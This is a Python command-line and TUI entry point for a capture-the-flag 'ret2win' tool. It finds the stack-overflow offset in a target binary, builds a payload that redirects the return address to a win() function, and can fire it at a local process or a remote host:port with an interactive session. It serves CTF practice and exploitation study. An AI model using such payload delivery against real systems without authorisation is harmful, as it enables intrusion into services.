#!/usr/bin/env python3
"""
ret2win.py - Ret2Win CTF Payload Generator & TUI

CLI entry-point and argument parser for the Ret2Win toolkit.
Supports both a rich interactive TUI (via --tui or zero-arg invocation)
and a fully scriptable command-line interface.
"""

__version__ = "1.3.3"

import argparse
import os
import sys

# Ensure local imports work regardless of launch directory or symlink resolution
sys.path.insert(0, os.path.dirname(os.path.realpath(__file__)))

import builtins
_orig_input = builtins.input

try:
    from pwn import (
        context, process, remote, ELF, log
    )
    # Ensure pwntools term wrapper does not hijack sys.stdout / sys.stderr / sys.stdin / builtins.input
    if hasattr(sys, "__stdout__") and sys.__stdout__ is not None:
        sys.stdout = sys.__stdout__
    if hasattr(sys, "__stderr__") and sys.__stderr__ is not None:
        sys.stderr = sys.__stderr__
    if hasattr(sys, "__stdin__") and sys.__stdin__ is not None:
        sys.stdin = sys.__stdin__
    builtins.input = _orig_input
    builtins._orig_input = _orig_input
except ImportError:
    print("[!] This tool requires pwntools. Install it with: pip install pwntools")
    sys.exit(1)

from rich.console import Console

import core
from tui import launch_tui, create_header_renderable

# Re-export core functions for backwards compatibility
find_offset = core.find_offset
build_payload = core.build_payload
validate_offset = core.validate_offset
check_binary_executable = core.check_binary_executable


def main():
    # If launched with no arguments in a terminal, automatically launch the TUI
    if len(sys.argv) == 1:
        if sys.stdin.isatty():
            launch_tui()
            return
        else:
            print("[!] No arguments supplied. Use --help or run interactively to launch TUI.")
            sys.exit(1)

    parser = argparse.ArgumentParser(description="Ret2Win CTF payload generator & TUI")
    parser.add_argument("--version", action="version",
                        version=f"%(prog)s {__version__}",
                        help="Show version information and exit")
    parser.add_argument("--tui", action="store_true", help="Launch the interactive Rich TUI")
    parser.add_argument("--binary", default=None, help="Path to the target binary")
    parser.add_argument("--win-addr", default=None, help="Address or symbol of the win() function, e.g. 0x401196 or 'win'")
    parser.add_argument("--offset", type=int, default=None,
                        help="Known offset to the saved return address (skips auto-detection)")
    parser.add_argument("--max-len", type=int, default=2048,
                        help="Max cyclic pattern length used for offset auto-detection")
    parser.add_argument("--align", action="store_true",
                        help="Add stack-alignment padding (x86_64) before jumping to win()")
    parser.add_argument("--ret-gadget", default=None,
                        help="Address of a lone `ret` gadget, used together with --align")
    parser.add_argument("--input-mode", choices=["stdin", "argv"], default="stdin",
                        help="How input reaches the vulnerable buffer (stdin or argv)")
    parser.add_argument("--output", default="payload.bin", help="File to write the raw payload to")
    parser.add_argument("--run", action="store_true",
                        help="Launch the binary locally, send the payload, and go interactive")
    parser.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"),
                        help="Send the payload to a remote host:port instead of running locally")
    parser.add_argument("--no-color", action="store_true",
                        help="Disable Rich formatting and color output")
    parser.add_argument("--script", default=None, metavar="FILE",
                        help="Generate a standalone solve.py script and save to FILE (does not run)")
    parser.add_argument("--validate-offset", action="store_true",
                        help="Run offset validation after auto-detection (re-crash with computed offset)")
    args = parser.parse_args()

    # Route to TUI if requested
    if args.tui:
        remote_h = args.remote[0] if args.remote else None
        remote_p = args.remote[1] if args.remote else None
        launch_tui(
            binary=args.binary,
            win_addr=args.win_addr,
            offset=args.offset,
            align=args.align,
            ret_gadget=args.ret_gadget,
            input_mode=args.input_mode,
            remote_host=remote_h,
            remote_port=remote_p
        )
        return

    # In CLI mode, allow pwntools info-level messages through
    # (NOTE: 'warn' actually suppresses log.info() output entirely in
    # pwntools' logging hierarchy, which silently hid all of the
    # Binary/offset/validation status messages below -- 'info' is the
    # correct level for "info and above" to be shown).
    context.log_level = 'info'

    # In CLI mode, ensure required arguments are present
    if not args.binary or not args.win_addr:
        parser.error("Both --binary and --win-addr are required in CLI mode (or run with --tui).")

    # Display ASCII Header in CLI mode
    console = Console(no_color=args.no_color, force_terminal=not args.no_color)
    console.print()
    console.print(create_header_renderable())
    console.print()

    if not os.path.isfile(args.binary):
        print(f"[!] Binary not found: {args.binary}")
        sys.exit(1)

    analysis = core.analyze_binary(args.binary)
    bits = analysis["bits"]
    symbols = analysis["symbols"]

    try:
        win_addr = core.parse_address(args.win_addr, symbols=symbols)
    except Exception as e:
        print(f"[!] Failed to parse win address: {e}")
        sys.exit(1)

    ret_gadget = None
    if args.ret_gadget:
        try:
            ret_gadget = core.parse_address(args.ret_gadget, symbols=symbols)
        except Exception as e:
            print(f"[!] Failed to parse ret gadget: {e}")
            sys.exit(1)
    elif args.align and analysis["ret_gadget"]:
        ret_gadget = core.parse_address(analysis["ret_gadget"])
        log.info(f"Auto-selected detected ret gadget: {hex(ret_gadget)}")

    log.info(f"Binary: {args.binary} ({bits}-bit, {'PIE' if analysis['pie'] else 'no PIE'})")
    if analysis["pie"]:
        log.warning(
            "This binary is PIE. --win-addr must be the RUNTIME address "
            "(base + static offset), not the static address from objdump/readelf, "
            "unless you've disabled ASLR and computed it yourself or leaked the base."
        )

    if args.offset is not None:
        offset = args.offset
        log.info(f"Using supplied offset: {offset}")
    else:
        try:
            offset = core.find_offset(args.binary, max_len=args.max_len, input_mode=args.input_mode)
        except Exception as e:
            console.print(f"[bold red][!] Offset detection failed:[/bold red]\n{e}\n[dim]Pass --offset manually if known.[/dim]")
            sys.exit(1)

    if args.validate_offset:
        log.info(f"Validating offset ({offset}) on target binary...")
        try:
            is_valid = core.validate_offset(args.binary, offset, input_mode=args.input_mode)
            if is_valid:
                log.info(f"Offset validated: {offset} (Instruction pointer verified)")
            else:
                log.warning(f"Offset {offset} validation did not match expected crash pattern.")
        except Exception as e:
            log.warning(f"Offset validation error: {e}")

    # --script mode: generate solve script and exit without building/sending payload
    if args.script:
        remote_target = None
        if args.remote:
            host, port = args.remote
            remote_target = (host, int(port))

        script_content = core.generate_solve_script(
            binary_path=args.binary,
            offset=offset,
            win_addr=win_addr,
            bits=bits,
            align=args.align,
            ret_gadget=ret_gadget,
            remote_target=remote_target,
            input_mode=args.input_mode
        )
        with open(args.script, "w") as f:
            f.write(script_content)
        console.print(f"[bold green]✓[/bold green] Solve script written to [cyan]{args.script}[/cyan]")
        return

    payload, table = core.format_payload_breakdown(
        offset=offset,
        win_addr=win_addr,
        bits=bits,
        align=args.align,
        ret_gadget=ret_gadget
    )

    with open(args.output, "wb") as f:
        f.write(payload)

    log.success(f"Payload written to {args.output} ({len(payload)} bytes)")
    console.print(table)
    console.print(core.format_colorized_hexdump(payload, offset, has_align=args.align, bits=bits, ret_gadget=ret_gadget))

    if args.run or args.remote:
        # argv[] entries are NUL-terminated C strings, so a payload that embeds
        # a null byte anywhere before its final byte can never be delivered
        # whole via argv -- this is a kernel/execve limitation, not something
        # this tool can route around. Most 64-bit addresses pack with trailing
        # 0x00 bytes, so this is the common case rather than an edge case.
        # Without this check it previously crashed with a raw, unhandled
        # pwntools traceback instead of a clear explanation.
        if args.input_mode == "argv" and not args.remote and b"\x00" in payload[:-1]:
            print(
                "[!] This payload contains a null byte before its final byte, "
                "so it cannot be passed whole as an argv[] argument (argv "
                "strings are NUL-terminated). This is a fundamental limitation "
                "of argv-based delivery, not specific to this tool -- switch "
                "to --input-mode stdin if the vulnerable program supports it, "
                "or choose a win address / gadget without embedded null bytes."
            )
            sys.exit(1)

        try:
            if args.remote:
                host, port = args.remote
                conn = remote(host, int(port))
                conn.sendline(payload)
                conn.interactive()
            else:
                binary_dir = os.path.dirname(os.path.abspath(args.binary)) or "."
                if args.input_mode == "argv":
                    conn = process([args.binary, payload], cwd=binary_dir)
                else:
                    conn = process(args.binary, cwd=binary_dir)
                    conn.sendline(payload)
                conn.interactive()
        except Exception as e:
            print(f"[!] Execution error: {e}")
            sys.exit(1)


if __name__ == "__main__":
    main()
